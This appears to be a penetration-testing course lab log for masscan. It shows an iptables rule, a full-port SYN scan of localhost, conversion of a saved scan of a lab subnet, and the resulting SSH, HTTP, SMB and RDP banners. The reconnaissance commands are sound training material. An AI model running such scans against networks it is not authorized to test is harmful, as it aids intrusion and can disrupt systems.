
# Linux

## Lab 1.3 - Masscan

### Linux

#### 1: Scan Preparation

```
sec560@560vm:~/Downloads$ sudo iptables -A INPUT -p tcp --dport 55555 -j DROP
sec560@560vm:~/Downloads$
```

#### 2: Initial Scan

```
sec560@560vm:~/Downloads$ sudo masscan --ports 0-65535 --rate 15000 --src-port=55555 -oB /tmp/local.masscan 127.0.0.1
Starting masscan 1.3.9-integration (http://bit.ly/14GZzcT) at 2026-03-06 01:31:51 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [65536 ports/host]
sec560@560vm:~/Downloads$  
```

```
sec560@560vm:~/Downloads$ ls -l /tmp/local.masscan
-rw-r--r-- 1 root root 228 Mar  6 01:32 /tmp/local.masscan
sec560@560vm:~/Downloads$ masscan --readscan ~/labs/masscan_10.130.10.0_24_full.bin -oX /tmp/masscan_10.130.10.0_24_full.xml
less /tmp/masscan_10.130.10.0_24_full.xml
[+] --readscan /home/sec560/labs/masscan_10.130.10.0_24_full.bin
sec560@560vm:~/Downloads$ 
```

```
sec560@560vm:~/Downloads$ cat /tmp/masscan_10.130.10.0_24_full.gnmap | sort
Host: 10.130.10.10 ()	Port: 22	Service: ssh	Banner: SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.5\x0d\x0a\x00\x00\x04\x5c\x07\x14\xd9\x8f\xde\xc2\xd5\x05\xcc\x13\xfb\xa9\xe3\xf09cb\xa9\x00\x00\x011sntrup761x25519-sha512@openssh.com,curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group14-sha256,ext-info-s,kex-strict-s-v00@openssh.com\x00\x00\x009rsa-sha2-512,rsa-sha2-256,ecdsa-sha2-nistp256,ssh-ed25519\x00\x00\x00lchacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@openssh.com\x00\x00\x00lchacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@openssh.com\x00\x00\x00\xd5umac-64-etm@openssh.com,umac-128-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,umac-64@openssh.com,umac-128@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1\x00\x00\x00\xd5umac-64-etm@openssh.com,umac-128-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,umac-64@openssh.com,umac-128@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1\x00\x00\x00\x15none,zlib@openssh.com\x00\x00\x00\x15none,zlib@openssh.com\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04D\x0b\x1f\x00\x00\x01\x97\x00\x00\x00\x07ssh-rsa\x00\x00\x00\x03\x01\x00\x01\x00\x00\x01\x81\x00\x91\x81fY\xf3*7\x01)w\xaeJ\xde\xaeB\xa7bfL$\xb2\x82\x9bq\xc4ToB\xd5\x5c\xf8[\xd2\xbf\xb8\xc5\xcd\x0a\xdc\xa5\xacPX\xb8\xa0\xd4\xe1\x08\xean\x8e\x8d\xb8\x8ew\x17\x9a\x17+\xb7;\xda\x18\xc9\xeb\xbf{dV%\x7f+~ \xfaC\xcb\x05%\xb5\xa2\x99d\x89\xb2\xf9\xbe\x10E\xea\xb9B\x83\x1a\x8d\xa7O\xe4\xfe6\x07\x8d\xdb\xf7\x8c7^\xb5\xcaW\xf2Q\xb7\x84\xad!\x1bYs\x83`\x00\x12\x133B\x1b\x02\xcd\x93\x91\xfe\x97\x80\x1e\x0a\x09o\xbb\x07}1\x96{ \xdcC\xfawM\x8eBh\x17\x10\xe9Cx\xb0\xd3\x9d\xac\xae\xa6q\xc6\xc3\xc3\x9c\x14\x99\xbeW\x85\xad\x3c\xd2\xb6\x14\xe8u\xd4\xd2\xceh\xba/,\x9fSi\xee\xce2\x1aKo\xd8Y\xc2\x19h\xf5\xd8\x84FWDY\xba\xc1\xa2\xc1\x072~\xce\xac\xa4f+\xc9\xe6\x08\xa1p\x26\x1fR\x9e\xdf\x05\xa3J\xc3\x88\x9b\x8a\xea\xd5\x9f\xc2\x9b\xc4\xcbU\xed\xb6\xae\x8f\x09\x17\x04=_\xa5 9\xd0\xdd^1\xf1\xbc\xc9\x22\xbci/\x9c\x03\x18L\xa9\x922i\x10K\xf1\x3c\x97\x3cw\x8d\xe1\xadw\xab\xc8 \x0a^Y\xae\xa5\x84S\xc5R\xad\x1d\xd7\xf4\xf9\xa5XA\xa1\x91K\xeb[2d\x3e\xb6CKyax\xbc\xe8\x05\xabb\x5c\xcdQu\x8c\xec@nLNU\x1e\xaf\xa5\xf4\x1d\x1c\x90\x13v\x18\x0cZ,3\xb3\x15\xbcs)\x8d@\xb8\x97U\xf1\x8b\xc8\x00M\xa7^\x5cH2\xf5\xe8\xd4\x8b\xd9\x1d\xae\x1e\xc9nT\xd9\x00\x00\x01\x00X~\xa8n\x1a\xafN\x0f\xb7\xd5\x3eE\xf7\x8ec(\x3c\xed\x26h\xee\x8e\x02\xb0+]\xf4\xee\x1a\xf3\xa4\xe9\xc4|\xe8\xe6\xe8S*\x85g\xbbT\x01\x0a\xa5\xa5\x87\xc8\xec\x27\xec\xac\xcd#7\xc9\xe7xt\x983\x93\x01\xfe\x98;\xb7]#\x9b\xf4P\xbc\xe1\xf3i\xc6*\xd3\x1c\x91\x1af\xd2\xe8\xdd\x9cr\xb7\x89b_\xd6\xdal\xae\x1dU\xb2\x16\x9c\xa3\xf0\xbf\xa4?\xcb\xcd\x9b\xf1k\x85\xcb\xd19\xb8\xf3\xf3qI\xeeeVb\xde\xc2dz\x0bw=\xda\xfd\xec\xca\x8f\x8f\xec4\xfb\x95\xb0\xe4\x188\xc5\x1b\xe6\x95\xf3\xado\xb0V\xf3\x9c!\xd3\xdc\x7f\x0f\x1d\x11y\x88\x0b\xd9\xa7\x10\x95\x18K\x15\x94\x92\xfe\x13\xc4\xac\xda%\x86\x06w\x1a\xe9\x90:\xe1kQA\x0b\xbb\xb2$\x04\xd5Z\x91Q2\xe0\x5c\x0d\xc7\xe3+tp\xf8\x8f\xa1\xdcu\xe4\xbd\x90\xcf\xcc\x8b\x19K\x27\xe4\x04l\x3c\x04r\x06T\xe2@\x172\xb1,\xf2U\xdd\xa8\x89\xc1^I\x90\x90\x0f\x8d\xdd.\x99\xabq\x00\x00\x01\x94\x00\x00\x00\x0crsa-sha2-512\x00\x00\x01\x80\x22\xcd\xd1\xd2\x87n\xcb\xe2(1\xedl\x05^\x86J\xa2}\xc7\xeaZ\x00\xf6\xd3\xb5\x075t\x26\xf79.\x05d\xe5\x81r\xb9\xf8.`h\xae\x0d\x18\x0d\x99\xaa\xf5\xb8\x05y\xd6\x88\x91\x97\x86#Qk\x9c\xe0\x8e\xe4}\x3c\xd8\xaf\xc6\xf7\x0c\xdd\xfe,t\x09q\x80\xc2\xf30\xd3z\x7f\xb3\xc8\xf7x7\xeblr\x11\x9c\x12t\xe4\x866\xa2L\xfa\xc4zo\x955\xa6~\xecc\xed\xf9\xad\x98\xa7\x8fu\x164\xf6VA\xd7\xb7\xe8dz\xc6=\xd0Z\x11\x27\x98\xf9*\xb9\x1e#\xaa\xed\x98\x17)\xb3\xe7}\xc7\xd5\x16h\xe2C\xa8\x0a0\x98re\xc3Jq\xe82\x87\xb9c\xaeFs*\xd9\x22\x19\xb6\xd9\xe7N\xb1r$\x06q\xa0E\x05\x88\xaeQ\x8a\xd4d\x0az\xb9L\xa2$\xd2\xe3M|\x00\xea\x27\x93\x030\x12J\xe3\x9a\xcf6\xe3\x13\xd2\xbd\xa6sL\x1c\xdei4\xa7\xdb\xe8\x92\x10\xac \xbd\x88W\xe3\xf5\xd9q\x0a\xec\xa4\xe4\xe9\xc3\x95{G\xd2\xaf+\x8e\x14\x9d.\x07o\x10J\xe5\xfcY\xf3\x92(\xdd\x16d\xf7\x18K~\xc9\xc3w\xce\x17\x26\xfd\x02\x1c\xee\x08\xde\xc8\x27\xc9P\xeb\xab8\xad\x11@\xbc\x07[\x81\xf8N\xb0\x83\x94\xdf,R]g\x0f\xc7*\xe5\xb8\xbe\x92+u\xc7\xb7GF2\x19\xe1#@\x9b\xdc%v\xc3\x0f\xf9\xa0\xdb\xfc_\xd9\x1c\xf5\xf3f\x05\xbfR^\x99\xda]\xea.R\x0a\x9eY\x13\xbf\x1f\xd6\xe9\x26\x9a\x86\x9c9\x8e\xe6.\xe4\xb3\xaa\x0fQN\xf52\xab\x0c\xf8\x10-\xf5\x8c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0c\x0a\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00~\x00e\xe5\x16\xc1F\xedD\xe1{.u#\x95\xa7\xfd\xf8~(\x9e\xe4\xdej\x22\xff\x13\x0au\x9a\x90\x01w\x0d\xba\xa6\x26e\xfd\xaf\x5c\x93\xd2{\xdc-`:\xfd\x01?\x18W\x1d\x09\x1d/\xbf\xe7\x07\xe4\x5cce\xe9\x82\x3c\xc5\xd3\xa8\x91\xb9\xb9\xe1f\x83\x8e\xb2\xbe\x0eL\xf7\xdaD\xa41W\x18\x954\x95\x92%\xbdA\xf94=A\xc3hi\xf6]\x9d\x0b\x0d\x9b\x05\xa5\x87\x16\x8c\x98\xc4\x06\xd4\x00\xf7d\xc5\xd4i\xe4\x8b\xe2 \xed\x1f\x0a\xfc\xca\x5c\xb1r\xe1\xaaD\xa7\xe6\x8f\xd9\xe4\xf3\xe4\x8c\x3c\x13T\x95;\x99\xd2k\xc1\xab\x06\xe9\x1cc\x1b@:\xeb\xfe4|\x9e0\xa6\xf2\xb0\xd4b\x87%\xffD?3H \x99\xb9\xa7\x14\xd1\xa1\x80\x3e\xcd*\xb0\x97\x14\x1biw\x00\xc9i\x91M\x8d\x92\x8c\xc2\x99m\xfd\x17\xaf\xcb\xa9\xd9\xa3
Host: 10.130.10.10 ()	Port: 23	Service: ssh	Banner: SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.5\x0d\x0a\x00\x00\x04\x5c\x07\x14%Z\x9b\x8d\xe5\xd8\x912.\xcc\xd9\xd6\x01\x93\xb5@\x00\x00\x011sntrup761x25519-sha512@openssh.com,curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group14-sha256,ext-info-s,kex-strict-s-v00@openssh.com\x00\x00\x009rsa-sha2-512,rsa-sha2-256,ecdsa-sha2-nistp256,ssh-ed25519\x00\x00\x00lchacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@openssh.com\x00\x00\x00lchacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@openssh.com\x00\x00\x00\xd5umac-64-etm@openssh.com,umac-128-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,umac-64@openssh.com,umac-128@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1\x00\x00\x00\xd5umac-64-etm@openssh.com,umac-128-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,umac-64@openssh.com,umac-128@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1\x00\x00\x00\x15none,zlib@openssh.com\x00\x00\x00\x15none,zlib@openssh.com\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04D\x0a\x1f\x00\x00\x01\x97\x00\x00\x00\x07ssh-rsa\x00\x00\x00\x03\x01\x00\x01\x00\x00\x01\x81\x00\x91\x81fY\xf3*7\x01)w\xaeJ\xde\xaeB\xa7bfL$\xb2\x82\x9bq\xc4ToB\xd5\x5c\xf8[\xd2\xbf\xb8\xc5\xcd\x0a\xdc\xa5\xacPX\xb8\xa0\xd4\xe1\x08\xean\x8e\x8d\xb8\x8ew\x17\x9a\x17+\xb7;\xda\x18\xc9\xeb\xbf{dV%\x7f+~ \xfaC\xcb\x05%\xb5\xa2\x99d\x89\xb2\xf9\xbe\x10E\xea\xb9B\x83\x1a\x8d\xa7O\xe4\xfe6\x07\x8d\xdb\xf7\x8c7^\xb5\xcaW\xf2Q\xb7\x84\xad!\x1bYs\x83`\x00\x12\x133B\x1b\x02\xcd\x93\x91\xfe\x97\x80\x1e\x0a\x09o\xbb\x07}1\x96{ \xdcC\xfawM\x8eBh\x17\x10\xe9Cx\xb0\xd3\x9d\xac\xae\xa6q\xc6\xc3\xc3\x9c\x14\x99\xbeW\x85\xad\x3c\xd2\xb6\x14\xe8u\xd4\xd2\xceh\xba/,\x9fSi\xee\xce2\x1aKo\xd8Y\xc2\x19h\xf5\xd8\x84FWDY\xba\xc1\xa2\xc1\x072~\xce\xac\xa4f+\xc9\xe6\x08\xa1p\x26\x1fR\x9e\xdf\x05\xa3J\xc3\x88\x9b\x8a\xea\xd5\x9f\xc2\x9b\xc4\xcbU\xed\xb6\xae\x8f\x09\x17\x04=_\xa5 9\xd0\xdd^1\xf1\xbc\xc9\x22\xbci/\x9c\x03\x18L\xa9\x922i\x10K\xf1\x3c\x97\x3cw\x8d\xe1\xadw\xab\xc8 \x0a^Y\xae\xa5\x84S\xc5R\xad\x1d\xd7\xf4\xf9\xa5XA\xa1\x91K\xeb[2d\x3e\xb6CKyax\xbc\xe8\x05\xabb\x5c\xcdQu\x8c\xec@nLNU\x1e\xaf\xa5\xf4\x1d\x1c\x90\x13v\x18\x0cZ,3\xb3\x15\xbcs)\x8d@\xb8\x97U\xf1\x8b\xc8\x00M\xa7^\x5cH2\xf5\xe8\xd4\x8b\xd9\x1d\xae\x1e\xc9nT\xd9\x00\x00\x01\x01\x00\x88.\x99\xd1 \x9a!\x91\xed/.|\xb7\x1f\xdb\xc6$!5\xbc\xa8\xd9\xf4\xd4\x98\x02^?\x8f\x94\x1f\xd7\x00\xfa\xafV=\xa7\x96\x1c\x1c\xe8hu\xa8.\x91Oq\x98D\xaaU\xe7y\x07\xdb\x13\xb1\x01cr\xd1j\xd4\xae\x0a\xbe\x93\x9d\xa2_\xfe\xdd(8\x9a\xf9\xa2\x0e\x9f\xed\x27k,1\xd2A\x8e\x15\x81\xa5\x83\x92u*T\x81\x1c\x8e\xee\xc0)\x95\xe1)\x8ak\xb3\xd0\xb3\x0a\xd9\xed\xb2qB\xe5\xbb+\xa1\xe2\xb2-9\x92\xc2A\xeb\x09\x0aj\x14\xc3\xd9Q\x9b\x9d\x12\x1a\xe1y\x15w.\x1e\x03\x5c\x22FF\xa9\x0d\x1fY\x83\xa0\x8c\xbe{{\xeek;}l\x12j\xf8\xf0c6\x88s\xfe\xbb\x03\x93\x19L ,\x03\xf8\x90{\x9f\x1fBE\x07\x22\xaa\x04\x1c\xed\xd2\xa4#\xe4\xab\xd5\xef\xa5P\xea\xc8\xe7ch\x97\xdd\x9c\xab\xcb\xab\xaahu\x8a\xca\xdb!\xfd\x15\x09\xd9\xc0\xbfW\xb0\xf5\x81\xe1,\x97\x0a\xfd\xa5\xd5g\xd61\x9a\xe8\xf9\xd6\xd3\xe3\xf6\x0d\x05mh\xbc8\x00\x00\x01\x94\x00\x00\x00\x0crsa-sha2-512\x00\x00\x01\x80\x90\xa8\xa5\xfdg\xa3\xa9w\xd1]\xf5\x3c@w\xdd\x9e\x8c\x82\x16\xc4\xef\xdf\xf7D\x83i\xd2S|P)\xe5\xb3\xcb\xa0\xd5\xa0E\x02\xcc\x15\xc8\xc9\xc9\xc8\x0f\x81\x0aR\xdaQJ^\xff\xf3z\x01x\xb2\x808\x8a8\xa9)\x98\xda-\xf4\xc0\x9e0\x97\xa9\xf2U5%\xd1z\xac\x1cw\xb3\x3e\x00-X\xdd\x80|A\x03\xef\xa3m\xaa5\x3eCd\xf1\xa2\xa3\x86\x0fEJS\x11sac\xf8\x96\xe9\xd7\x1d\xf3\xf6;Vs\x08x+%\x0f\x89\xd1p$e\xc4J\xf3g1\x89\xc9\x80\xa2z\xf2\x88#_\x19\x05^C\xd4`\xa1\x00\x03\xe1G\x27\x074k\x9f\x02^}\x95\xf4A\xda\x98\x26|\xbf\xd5\xdb\x22\xa6\xce\x99\xc5\xb9\xa2\xbaG\x18\x81\xc8\x90Y\x0b\x3e\xf1\x10?Yc\x22\x0c$\xd3\x0f\xe6\xab\x03\x1e\x87e\xa9\xd3}|\xca_l\xe3t\xfc?\xf3\x80g\xce\xbd\xe8Z\x9bX\xb0\xd1Q\x8d\xbaU\x07\xf6\xde\xfd\xd15\xe6q\xe2:\xf71\x3c\x8d,\x94\xfa\xcc\xe6\xcb\x92\xa7\xd3m\xc4\xd8h\x8f\xf2\xa4\xf8\x116J\xb14\xc5\xff\x03B\x13G\xcb\x92wJs\xc4\xd5\x03\xd7\x94g\x02\x95\x5c:\x9b\xf1\xc7\xc3X\x0f\xca\xbeQ\x9d\xc2\xcf\x0f\xc2\xc7d\xdb{\xcd\x9a\xd3H\x0c6GI6\xf7K\x1fR\x17\xf2\xfe\x3c\xe8\xcb\xd8\xe4n$\xd7\x962\xe6A}`\xda\x8f84`\x8b\xd4{\x13\xc5\x84\xd1\x12\x26\xbd:\x9f\xe2\x07M\x0c5\xbb\xf5\xda8c\x87\x81giK!}\xf4\x92\xc9\x0a\xf2\x9e~lk\xaeL\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0c\x0a\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00T\xdf\xadCrJ\x18\xbf\xf1\xdeh\xbbg\xd2\x07\x86d\x5c\xec\xce\x9a\x97M\x16\xe1L\xe4\xc9*,\x27\xbb\x9f\x9c\x83\xe1\x14@g\x8au\x1c\x0cS\xed\xefF\x3e\xcc\xcd-N\xa4d*\xdc\xa0\xf2\x0ew\x9a\xd6d\xca\xd9I\xb5\x84\x19\x93I\xad\x023\x14\xee\xf7\xe7!\x129rq\xee\xa9\x0a\x96\xbc-\xf8#\x90J#\x9a5z\xd2\xb98\xb8\x85;\x91\x17i0\x95m\x8a\xe7Fu^\xc9a-\xab!\xf9\x03\xa0\xa3({t\xc5\x27\x01\xe7\x10\xc5\xab\xec|\xbe\xca\x96\xc8m\xb6\x0e*R\x5c\x84\xfb\x16MzX\xa0\x26\x15\xf2,\xacW\x9b\x9bZ\xe6\xe9\xed/.\x8b\xf4Qf\x1e0$MRE\xed2\xa6\x96K\x0dA[\x97\x9a9\x5c\x87T\xca\x02\xed\xb2\x92\x8eAf\xee\xbfwIA\x1f\xd2m\x1b\x85r\xe1.\x82(P\xa1V
Host: 10.130.10.10 ()	Port: 80	Service: http	Banner: HTTP/1.1 200 OK\x0d\x0aServer: nginx/1.24.0 (Ubuntu)\x0d\x0aDate: Tue, 24 Sep 2024 04:22:22 GMT\x0d\x0aContent-Type: text/html\x0d\x0aContent-Length: 615\x0d\x0aLast-Modified: Wed, 11 Sep 2024 23:16:10 GMT\x0d\x0aConnection: close\x0d\x0aETag: \x2266e224ba-267\x22\x0d\x0aAccept-Ranges: bytes\x0d\x0a\x0d
Host: 10.130.10.10 ()	Port: 80	Service: http.server	Banner: nginx/1.24.0 (Ubuntu)
Host: 10.130.10.10 ()	Port: 80	Service: title	Banner: Welcome to nginx!
Host: 10.130.10.11 ()	Port: 22	Service: ssh	Banner: SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.5\x0d\x0a\x00\x00\x04\x5c\x07\x14\xe6s=A;\xa1\xfb\xe9\x22\xae\xbcz\x86\x87\x18O\x00\x00\x011sntrup761x25519-sha512@openssh.com,curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group14-sha256,ext-info-s,kex-strict-s-v00@openssh.com\x00\x00\x009rsa-sha2-512,rsa-sha2-256,ecdsa-sha2-nistp256,ssh-ed25519\x00\x00\x00lchacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@openssh.com\x00\x00\x00lchacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@openssh.com\x00\x00\x00\xd5umac-64-etm@openssh.com,umac-128-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,umac-64@openssh.com,umac-128@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1\x00\x00\x00\xd5umac-64-etm@openssh.com,umac-128-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,umac-64@openssh.com,umac-128@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1\x00\x00\x00\x15none,zlib@openssh.com\x00\x00\x00\x15none,zlib@openssh.com\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04D\x0a\x1f\x00\x00\x01\x97\x00\x00\x00\x07ssh-rsa\x00\x00\x00\x03\x01\x00\x01\x00\x00\x01\x81\x00\xec\xc8C\xd6\xeb\xbe\x83%\xa74\xbc\xa9 r\xff\xaf\x17j\x9c1\xf0\xb7\x82\xfa\x84\xd7\xe0L\xc7\xfd;3\xfe\xd9!\xbf\xc2Uo\x90\x05\xadg\xa5\x942\x8fc\x16t\x0a\x88\xac\xb7\xbf\xf7\xda\x0c\xebC]\xcf\xa3\x81\xf0\x94\x0f\xa3\x89\xf2\x0f\xdb\xe1\x9d\xf8]i\xb4A\xa0\x18:\x8a\xb7\xff\x93\x8d\x1b\x87e7\x06Oh\x81\x3ejiuE\xda\x94\xac\xd0\x7fL\xc5\x1b\xc8\xbat\xfa\xa3\x03\xad\x09)!\xf1\x0a\xc0\x8c\xb4\xe6\x1b\x05\xfc\xbc\xa9;\x9f\x86\xd4\xe8\xf4}\x08E|\xa3\x0f\xc1\x1b\x18\x87\xde\xcf\xa8\xc0\xde\x17\x3c\xf8W\xff\x0d\xde\xac\x11~)\x0a\xc6\xa3\xe6|g\xe0\xf0R\x95X\xb9+\xb5z\xea\xd5h\xa8\xf8\x88QN\xa4\x27\x0e\xcc\xab\x27\xf6\xaa\xdae\xf6\x0d\x8aC\xad\xf5\x192\x13\xc7\x8f:\x99\x0b\xf1\xa2\x9f1\x8b\xf1Z\x85\x26\x1b\x27\xb8E\xcey\xe6\xf0S\xc6\xa3F\xa2\x0f\xa7kt;h\x96=o\x22\xb7n\xafB\x94m\xe97]\xab\x8a\xd4\xa7\x19\x8d\x11\x0c\x18\x922\xa1\xc3\x18\xd6\xe2h\x95\x9b\xdf\x00A\xceO\x0d5fR\xa9^\xe9\x3e\x7f\x15\xe7y6`-\x26\x90\x278\xc6\xb5}h\xe2\x11n\x85B(g,\x83\xa0sW\xdf\xc5\xe6o_\x83u-S\x5c\xbb\xaf\xb6n\x0bK\x84\x86v\xb3\xbb\x9e(3\x98U\xc5\x10jX[\xd9\x17\xa0\x1a\xff\xeb\x1a\x262\xef{\xc8\xc4\xff\xc7\x1dC\x07\xefX\x18\xdc\xb5W\xee\xc0\x95v\x1cNky\xfei\xf3)\x22\xb23G\xd8\x9b\xe05\xfd\x00\x00\x01\x01\x00\xe1\x27\x958\xad\xee\x86]\x98\xc1m6\x1a\x9a\xd7\x9cF\x9c\xa4]\xd3U\x80\xee{=\xfc\xd8\x9c\xeeL\xae\xc0YH\x96M\x85\x947\x0ee\x0eP\x98k4\xc6\xb2\xee\x09Z9\x8d\xee\x04\xd5\xfa\x0c\x97i\x97\x0d\x06\x11Xg\xfc\xe1\xd9\xb7\x09\xcb\xb3E\xda\xf5\xacg\x1a\x0f\xa5\xcb\xb3\xed\xabo\x89\xfd?\x3e\x9bW\xe3!4D\x021,\xc7\xef\xd10\xf4\x9dL\xd2\x14\xc6n\xb3\x07\xe8\xb09\x5c\x98DU\x82\x0c#\x0c]\xdf\xa3|\xe9^Gqi\xef~\xf5\xf3\xf9\xe5\xedPm)\xa3\xbaF\xafS\x8c\x9fas\xa0\x0a5h\xb8bU2\xb07\xf8\x88W\x17\x15P\x8e\x0bJKK3\x86\x988\xabOy\x02\x14Mq\xd6Y\xe8\x9f\x81\x06\x91!\xad\xe3\xfes\xeb\x0a-\x1c\xa0\xe5Y\x8f\xd9|\x9e\x90\xb2\xae\xbb\x1f\x89\xf3\xe2\xf9\x94\xfc\xa2\x9c\xdd\xa1!\xd8Qn\xe0\xd3\x26P\xfc\xc6\xe1\x09\x0c6AwT\x0d2\x85\xa78\xc9G\xf6\x18H\xb5B\xfa\x85[M\x26\x00\x00\x01\x94\x00\x00\x00\x0crsa-sha2-512\x00\x00\x01\x80\xa4\xfe\x84B\xe5\xb5\xf2\x5c\xd3Q\xa4n\xbb\xfep\x04\x1e\x89_)\xeb\xa1\xea\x8dh\x89\x16fu\x17\xf3\xdd\xee\xa2\xa7\x8a\x8b\x10\x0b\xc4g\xbe \xb7\xb2A\x97\xd8\xc9\xd9\xa3\x5c\xbe\xb6\x22p\xd7\x89:\xe3kEuF\x8bO\xbdR\xd1\xb8\x85!}\x08b\xe5\xd0({|\xefd\xda\x12\xc1.\x22\x9c\x86\xe9GI\xe6\x0f\xe0\xb2\x08A\xc6\xb0\xc2,\xbb\x88\xbf}\xed\xddd\xe7\x00\x8f\xed\xd6\xf3B\x88z_\xb6\x8d\x91k\x1a\x9076\xaf$z{\x27\xf7d\xd5.\xc3v{\xc0\xad\x0f\x96\x3e9\x8aF\xb8h\xd4\xb0\xd2g\x8a\xafk\xc5T8\x17\xc8Y\x04\xcb\xfe\x0d\xc6\xc8\xa1.\x19\x1d\xcc\x98\xed7\x19X\x26\xfc\xf7b0\x26\xb4\xd0\x82*U\x84b\x08\xc1\x98\xce\xb5\xbcn\xa7 ]\xf9\x0c\xb0\xe4\x0825X\x9d*\x0ci\xd3\xa0\x0a.M(\xb9\x17fgO\xa6\x18\x0b\xba[\x07\xbb\xdb\xcei\x22\x09w\xafA\xb6\xb1\xd8\x9f\x98\x0f\x98K\x9bsa\xf5^ht\x0b\xfd\xd9@\xd4\xcb\xae\xe9,\x0610\xca\x17\x1d\x0b\x9f\x8c.\x9aD\xa4\xfe\x86\x12\xa2\x08,|\xe5\x8c2\x8f\xf0\x9dUx\x7f\xf8~x#m/\x9cz\x97\x85L\xd1-\x1a\xb8F\xf7X\xd6A\xc9\x94\xc5G\x3e\xdfC\x0a*\x9e\x9b5\xb0*\xa6\x04\x0a\x8b\x80~\x19\x14\xe8\xbf\xd2(\xd3\xe9\xae\xe3!iu\xfb q\xb4\xcb\xa6\x7f\xf3\xadM\xb9\x9aI\x0b\xb4r\xc9\x88)e\x09=P_\xab\xab\x99#\xe4\x15K\xbfa\xaa\xbe\xf6\x07\xe5\xb6\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0c\x0a\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00O\x9d\x8a\xbc\x0c\x14\x08O\xa6\xb4\xc2\x0aY.\x0f6\xae\x04\xb4|\xd264t\xfa\xf3\xd9\x91}\xc3E\xe4l\xd3\x86?\xb9\xfe\x9b:W\xbaD2\xb9w\xb2\xbbH},w\xc4\xd3N+\xa8a\x0c0\x8a\xe3,\x13P\x0f\xde\x82\x84k\x90\xb7\x92x\xd1\xc5\xd8Z\x12\xefy\xa6\xa0\xf7\x03R\xb7\xe36\xe0U\xa8\x83\xee\xb2\xad4_\xb8\xd3\x07\x02n9\x03\xa9\x11\xa7\x14\x98\xae\xd3\xd1\x9f\xe3\x1f\x06\xdc\x3e=,\x8ba\x10V\xec\xf5\xda\x14K\x01\x18\x5cVgJ\xfb{\x94(\x1e+\xc5GN\xa2_\xf6Un\xda\xea\xb3x\xc1\x97\xf0L\xc5\x82\xc6\xd21\xd9f\xba\xba\xd3\xbb\xe4\xf788\xfe\xbe!\xdev\xd3\xadA\x09\x07\xeb\x85\x0ax\xc4\x83\x9c\xa9H\xd3\xb8\xb8/ \xd4\xa1\x3cD\x0a\x86\x18\xa9\xd5\x85]\x18\x882\x95\xa9\xb6[\xd9
Host: 10.130.10.11 ()	Port: 80	Service: http	Banner: HTTP/1.1 200 OK\x0d\x0aServer: nginx/1.24.0 (Ubuntu)\x0d\x0aDate: Tue, 24 Sep 2024 04:18:42 GMT\x0d\x0aContent-Type: text/html\x0d\x0aContent-Length: 615\x0d\x0aLast-Modified: Wed, 11 Sep 2024 23:16:45 GMT\x0d\x0aConnection: close\x0d\x0aETag: \x2266e224dd-267\x22\x0d\x0aAccept-Ranges: bytes\x0d\x0a\x0d
Host: 10.130.10.11 ()	Port: 80	Service: http.server	Banner: nginx/1.24.0 (Ubuntu)
Host: 10.130.10.11 ()	Port: 80	Service: title	Banner: Welcome to nginx!
Host: 10.130.10.21 ()	Port: 139	Service: smb	Banner: ERROR(Called name not present)
Host: 10.130.10.21 ()	Port: 3389	Service: rdp	Banner:  NLA-supported
